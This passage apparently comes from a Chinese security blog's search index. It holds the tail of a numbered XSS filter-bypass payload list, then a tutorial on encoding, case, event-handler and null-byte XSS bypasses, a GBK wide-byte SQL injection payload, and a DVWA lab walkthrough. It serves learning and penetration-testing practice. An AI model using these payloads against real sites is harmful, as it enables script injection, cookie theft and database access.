43.&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt; 44.&quot;&gt;&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt; 45.[color=red width=expression(alert(123))][color] 46.&lt;BASE HREF=&quot;javascript:alert(&#39;XSS&#39;);//&quot;&gt; 47.Execute(MsgBox(chr(88)&amp;&amp;chr(83)&amp;&amp;chr(83)))&lt; 48.&quot;&gt;&lt;/iframe&gt;&lt;script&gt;alert(123)&lt;/script&gt; 49.&lt;body onLoad=&quot;while(true) alert(&#39;XSS&#39;);&quot;&gt; 50.&quot;&lt;marquee&gt;&lt;img src=k.png onerror=alert(/xss/) /&gt; 51.&lt;div style=&quot;background:url(&#39;javascript:&#39;) 52.&lt;img src=&#39;java\nscript:alert(\&quot;XSS\&quot;)&#39;&gt; 53.&gt;&#39;&quot;&gt;&lt;img src=&quot;javascript:alert(&#39;xss&#39;)&quot;&gt; 54.&lt;svg&gt;&lt;script&gt;alert&amp;#40/1/&amp;#41&lt;/script&gt; 55.&lt;q/oncut=open()&gt; 56.&lt;q/oncut=alert(1)&gt;//在限制长度的地方很有效 57.&lt;applet code=&quot;javascript:confirm(document.cookie);&quot;&gt; // Firefox有效 58.&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=&quot;&gt; 59.&lt;form action=&quot;Javascript:alert(1)&quot;&gt;&lt;input type=submit&gt; 60.&lt;formaction=&#39;data:text&amp;sol;html,&amp;lt;script&amp;gt;alert(1)&amp;lt/script&amp;gt&#39;&gt;&lt;button&gt;CLICK 61.&lt;iframe/src=&quot;data:text&amp;sol;html;&amp;Tab;base64&amp;NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==&quot;&gt; 62.&lt;body/onhashchange=alert(1)&gt;&lt;a href=#&gt;clickit]]></content>
      <categories>
        <category>XSS</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[XSS绕过及DVWA实例]]></title>
    <url>%2F2018%2F12%2F01%2FXSS%E7%BB%95%E8%BF%87%E5%8F%8ADVWA%E5%AE%9E%E4%BE%8B%2F</url>
    <content type="text"><![CDATA[最基本的用法：&lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt; 黑名单绕过：大多数的场所是用的黑名单来做过滤器的。 尝试插入比较正常的HTML标签，例如：&lt;b&gt;，&lt;i&gt;，&lt;u&gt;来看一下返回页面的情况是怎样的，是否被HTML编码了，或者标签被过滤了。 尝试插入不闭合的标签，例如：&lt;b，&lt;i，&lt;u，&lt;marquee然后看一下返回响应，是否对开放的标签也有过滤。 大小写及重写的绕过:&lt;SCRIscriptPT&gt;AalLEerRtT(&#39;xss&#39;);&lt;/SCscriptRIPT&gt; 事件绕过：利用JS事件进行相关绕过：&lt;img src=# onerror=alert(&#39;xss&#39;);&gt; 相关JS事件： 编码绕过： 当浏览器接受到一份HTML代码后，会对标签之间（&lt;p&gt;xxx&lt;/p&gt;等，&lt;script&gt;除外)、标签的属性中（&lt;a href=&#39;xxxx&#39;&gt;）进行实体字符解码变为相应的字符，而不会发挥出其本来该有的功能，如：&#60;被解码为&lt;后仅被当作字符，而不会被当成标签名的起始。既然是字符串，那在href=&#39;xx&#39;这些属性值本来就是字符串的地方可以作为一种可能的绕过的手段 例如：&lt;img src=1 onerror=&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt; 上述代码解析后为：&lt;img src=1 onerror=alert(1)&gt; ,可以弹窗 在代码被HTML解释器解释后，如果遇到需要填入url的位置，则该位置交由url解释器解释，如果是js代码的(例如onclick=””)，就js解释器解释，但是注意：javascript:不能用url编码代替，因为javascript:为协议类型，若是使用url编码，会被当作普通字符串，后面的js代码也不会被当作js代码解释 &lt;a href=&quot;javascript:%61%6c%65%72%74%28%31%29&quot;&gt;&lt;/a&gt; 被url解释器解释完后为&lt;a href=&quot;javascript:alert(1)&quot;&gt;&lt;/a&gt;，url中出现了javascript:，指明了后面的语句要当作js执行，所以再次把解释后的字符交给js解释器解释，可以弹窗。 当js解释器在标识符名称(例如函数名，属性名等等)中遇到unicode编码会进行解码，并使其标志符照常生效。而在字符串中遇到unicode编码时会进行解码只会被当作字符串。&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(&#39;xss&#39;)&lt;/script&gt; 解码后为&lt;script&gt;alert(1)&lt;/script&gt;,一样可以弹窗。但如果是：&lt;script&gt;document.write(&#39;\u0039\u0041\u0059\u0097\u0108;\u0101\u0114\u0016\u0040\u0039\u0049\u0049\u0049&#39;)&lt;/script&gt; 解码后为 &lt;script&gt;document.write(&#39; &#39;);alert(&#39;111&#39;)&lt;/script&gt;就不要指望他可以弹窗了。因为解码出来的&#39;);alert(&#39;111仍为被当作字符串而不会影响上下文。 利用String.fromCharCode进行编码绕过测试代码： &lt;?php function xss_check($str){ if(preg_match(&apos;/script|alert/i&apos;, $str)) return &apos;error&apos;; else return $str; } @$id = $_GET[&apos;id&apos;]; echo xss_check($id); ?&gt; 屏蔽了alert(也可能是其他的)，此时可以使用编码绕过： &lt;img src=1 onerror=\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074:\u0061\u006c\u0065\u0072\u0074(/xss/);&gt; 将javascript和alert进行unicode编码实现绕过，成功弹窗。 利用String.fromCharCode进行编码绕过:&lt;img src=2 onerror=eval(String.fromCharCode(97,108,101,114,116,40,47,120,115,115,47,41))&gt; 其中String.fromCharCode(97,108,101,114,116,40,47,120,115,115,47,41)是alert(/xss/)编码后的内容，google插件hackbar就有此功能。 GBK宽字节绕过测试代码： &lt;!DOCTYPE html&gt; &lt;meta charset=&quot;gbk&quot;&gt; &lt;?php error_reporting(0); $conn = mysql_connect(&apos;127.0.0.1&apos;,&apos;root&apos;,&apos;root&apos;); mysql_select_db(&apos;test&apos;,$conn); #mysql_query(&quot;set names gbk&quot;); $id = addslashes($_GET[&apos;sql&apos;]); $sql = &quot;SELECT username,password FROM admin WHERE id=&apos;{$id}&apos;&quot;; echo $sql.&apos;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&apos;; if($res = mysql_query($sql)){ while($row = mysql_fetch_array($res)){ var_dump($row); } }else{ echo &quot;Error&quot;.mysql_error().&quot;&lt;/br&gt;&quot;; } ?&gt; 直接‘会被转义，不会被执行。 使用宽字符就可以被成功执行 解析过程 $_GET[‘id’]经过addslashes编码之后带入了‘’ 变成 &lt;pre&gt;2%df%5C%27 and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)%23&lt;/pre&gt; 带入mysql处理时使用了gbk字符集 %df%5c 運成功的吃掉了%5c %27‘单引号成功闭合 GBK编码，编码范围是0x8140~0xFEFE（不包括xx7F），在遇到%df(ascii(223)) &gt;ascii(128)时自动拼接%5c，因此吃掉‘，而%27、%20小于ascii(128)的字符就保留了。 0字节绕过&lt;scri%00pt&gt;alert(1);&lt;/scri%00pt&gt; &lt;scri\x00pt&gt;alert(1);&lt;/scri%00pt&gt; &lt;s%00c%00r%00%00ip%00t&gt;confirm(0);&lt;/s%00c%00r%00%00ip%00t&gt; 在IE9及以下版本成功绕过。 IE6下绕过IE下还可利用javascript:alert(/xss/); 或css body { background:black; xss:expression(alert(/zhuling.wang/));/*IE6下测试*/ } 成功绕过 DVWA测试用例反射性XSS低等级任意XSS都可用 中等级&lt;script &gt;alert(&apos;123&apos;)&lt;/script&gt; &lt;sCript&gt;alert(&apos;123&apos;)&lt;/script&gt; &lt;scri&lt;script&gt;pt&gt;alert(&apos;123&apos;)&lt;/script&gt; &lt;img src=# onerror=alert(1)&gt; &lt;h1 onclick=alert(1)&gt;123&lt;/h1&gt;等等 高等级过滤掉script标签更严格，不能使用script标签 &lt;h1 onclick=alert(1)&gt;123&lt;/h1&gt; &lt;img src=# onerror=alert(1)&gt; 其他html标签构造的事件还是可以使用的。 不可能级别用到了htmlspecialchars()，这个函数是将预定义的字符转换为 HTML 实体。预定义的字符是： &amp; （和号）成为 &amp; “ （双引号）成为 “ ‘ （单引号）成为 ‘ &lt; （小于）成为 &lt; （大于）成为 &gt; 存储型XSS低等级没有过滤直接注入，但是name框有最大长度限制，所以选择在message注入。 &lt;img src=# onerror=alert(1)&gt;等等 中等级因为一上来就给Message添加了htmlspecialchars函数所以不能进行注入，但是name框长度的最大限制是在html设置的，所以可以在审查元素中直接对长度进行修改。或者可以用burp抓包发送。 高等级message还是封死了，还是把script过滤掉了，跟中等级类似，抓包发送等等。 不可能级别这里对name和message都做了htmlspecialchars（）处理。 DOM型XSS低等级直接在网页导航栏构造GET XSS即可完成注入 中等级源码显示会过滤掉script标签，但是直接用&lt;img src=# onerror=alert(1)&gt;没有直接执行，尝试闭合option没有成功,尝试闭合select标签成功执行。 ?#default=&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;也可以。 高等级对传入值进行switch判断 ?default=English #&lt;script&gt;alert(1)&lt;/script&gt; #该字符后的数据不会发送到服务器端，从而绕过服务端过滤。]]></content>
      <categories>
        <category>XSS</category>
      </categories>
  </entry>
</search>
